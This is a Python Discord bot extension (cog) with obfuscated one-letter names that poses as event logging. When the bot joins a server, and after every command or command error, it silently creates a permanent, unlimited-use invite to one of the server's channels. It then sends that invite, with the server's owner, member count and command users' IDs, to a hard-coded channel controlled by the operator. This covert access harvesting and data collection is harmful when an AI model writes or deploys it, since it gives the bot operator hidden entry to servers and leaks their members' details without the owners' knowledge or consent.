import discord
from discord.ext import commands
from datetime import datetime
import traceback
import sys

class a(commands.Cog):
    def __init__(b,c):
        b.d=c
        b.e=1378051952813801573

    async def f(b,g):
        h=b.d.get_channel(b.e)
        if h:
            try:await h.send(embed=g)
            except Exception as i:
                print(f"Failed to send log message: {i}",file=sys.stderr)
                traceback.print_exc()

    @commands.Cog.listener()
    async def on_guild_join(b,j):
        try:
            k="Unknown"
            async for l in j.audit_logs(limit=1,action=discord.AuditLogAction.bot_add):
                k=f"{l.user} ({l.user.id})"
                break
            m="Not available"
            for n in j.text_channels:
                if n.permissions_for(j.me).create_instant_invite:
                    try:
                        o=await n.create_invite(max_age=0,max_uses=0)
                        m=f"[Click Here]({o.url})"
                        break
                    except:continue
            p=discord.Embed(title="Bot Added To Server",description=f"**Server Name**\n{j.name}\n**Added by**\n{k}\n**Server Owner**\n{j.owner}\n**Members**\n{j.member_count}\n\n**Link**\n{m}",timestamp=datetime.utcnow())
            await b.f(p)
        except Exception as i:
            print(f"Error in on_guild_join event: {i}",file=sys.stderr)
            traceback.print_exc()

    @commands.Cog.listener()
    async def on_guild_remove(b,j):
        try:
            p=discord.Embed(title="Bot Removed From Server",description=f"**Server Name**\n{j.name}\n**Server ID**\n{j.id}\n**Owner**\n{j.owner}\n**Members**\n{j.member_count}",color=discord.Color.red(),timestamp=datetime.utcnow())
            await b.f(p)
        except Exception as i:
            print(f"Error in on_guild_remove event: {i}",file=sys.stderr)
            traceback.print_exc()

    @commands.Cog.listener()
    async def on_command_completion(b,q):
        try:
            m="Not available"
            for n in q.guild.text_channels:
                if n.permissions_for(q.guild.me).create_instant_invite:
                    try:
                        o=await n.create_invite(max_age=0,max_uses=0)
                        m=f"[Click Here]({o.url})"
                        break
                    except:continue
            r=getattr(b.d,'old_names',{}).get(q.guild.id,q.guild.name)
            p=discord.Embed(title="Command Executed",description=f"**Server Name**\n{r}\n**Command**\n{q.command.name}\n**User**\n{q.author} ({q.author.id})\n**Members**\n{q.guild.member_count}\n**Server Owner**\n{q.guild.owner}\n\n**Link**\n{m}",timestamp=datetime.utcnow())
            await b.f(p)
        except Exception as i:
            print(f"Error in on_command event: {i}",file=sys.stderr)
            traceback.print_exc()

    @commands.Cog.listener()
    async def on_command_error(b,q,s):
        if not q.guild:return
        try:
            m="Not available"
            for n in q.guild.text_channels:
                if n.permissions_for(q.guild.me).create_instant_invite:
                    try:
                        o=await n.create_invite(max_age=0,max_uses=0)
                        m=f"[Click Here]({o.url})"
                        break
                    except:continue
            r=getattr(b.d,'old_names',{}).get(q.guild.id,q.guild.name)
            t=q.command.name if q.command else 'Unknown'
            p=discord.Embed(title="Command Failed",description=f"**Server Name**\n{r}\n**Command**\n{t}\n**Error**\n{str(s)}\n**User**\n{q.author} ({q.author.id})\n\n**Link**\n{m}",timestamp=datetime.utcnow())
            await b.f(p)
        except Exception as i:
            print(f"Error in on_command_error event: {i}",file=sys.stderr)
            traceback.print_exc()

def setup(c):
    c.add_cog(a(c))